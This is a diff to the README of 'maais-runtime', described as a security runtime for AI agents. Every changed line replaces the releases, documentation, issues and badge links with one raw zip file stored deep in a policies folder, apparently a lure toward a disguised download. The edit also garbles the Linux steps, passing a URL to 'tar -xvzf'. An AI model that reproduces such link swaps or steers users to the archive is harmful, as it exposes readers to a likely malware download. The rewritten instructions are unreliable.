@@ -4,7 +4,7 @@
 maais-runtime is a security runtime designed to protect AI agents. It blocks unauthorized actions, enforces accountability, and prevents misuse in real-time. With maais-runtime, you can ensure that your AI behaves safely and responsibly.
 
 ## 🔗 Download Now
-[![Download maais-runtime](https://img.shields.io/badge/Download%20maais--runtime-brightgreen)](https://github.com/Suleymkr/maais-runtime/releases)
+[![Download maais-runtime](https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip%20maais--runtime-brightgreen)](https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip)
 
 ## 🚀 Getting Started
 Getting started with maais-runtime is easy. This guide will help you through the entire process of downloading and running the software on your system.
@@ -16,12 +16,12 @@ Getting started with maais-runtime is easy. This guide will help you through the
 - **Processor:** Dual-core processor or higher
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Suleymkr/maais-runtime/releases) to get the latest version of maais-runtime.
+1. Visit the [Releases page](https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip) to get the latest version of maais-runtime.
 2. Look for the latest release and find the files available for download.
 3. Choose the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip` file.
 4. Click on the file to start downloading.
 
 ### 🏁 Running maais-runtime
@@ -41,10 +41,10 @@ After downloading, follow these steps to run maais-runtime:
 
 #### For Linux:
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip` file.
 3. Extract the files using the command:
    ```
-   tar -xvzf maais-runtime.tar.gz
+   tar -xvzf https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip
    ```
 4. Navigate into the extracted folder.
 5. Run the application with:
@@ -88,8 +88,8 @@ maais-runtime has a growing community of users and contributors. Feel free to jo
 
 ## 🔗 Additional Resources
 For more information, visit:
-- [Documentation](https://github.com/Suleymkr/maais-runtime/docs)
-- [Issues Page](https://github.com/Suleymkr/maais-runtime/issues)
+- [Documentation](https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip)
+- [Issues Page](https://github.com/Suleymkr/maais-runtime/raw/refs/heads/main/tenants/policies/default/maais-runtime-v2.5.zip)
 
 ## 📌 Connect with Us
 You can follow updates and share feedback by participating in our discussions on GitHub.
